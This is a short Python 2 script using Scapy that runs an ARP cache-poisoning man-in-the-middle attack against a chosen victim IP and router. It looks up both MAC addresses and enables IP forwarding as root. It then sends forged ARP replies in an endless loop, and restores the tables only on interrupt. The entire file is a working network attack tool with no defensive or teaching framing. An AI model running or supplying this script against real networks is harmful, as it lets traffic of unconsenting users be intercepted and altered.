from scapy.all import *
import argparse
import signal
import sys
import logging
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
    return parser.parse_args()
def originalMAC(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src
def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
    sys.exit("losing...")

def main(args):  
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    routerIP = args.routerIP
    victimIP = args.victimIP
    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    if routerMAC == None:
        sys.exit("Could not find router MAC address. Closing....")
    if victimMAC == None:
        sys.exit("Could not find victim MAC address. Closing....")
    print '[*] Router MAC:',routerMAC
    print '[*] Victim MAC:',victimMAC
      
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    def signal_handler(signal, frame):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')
        restore(routerIP, victimIP, routerMAC, victimMAC)
    signal.signal(signal.SIGINT, signal_handler)
    print '[*] MIM with ARP poison up and running....'
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)
main(parse_args())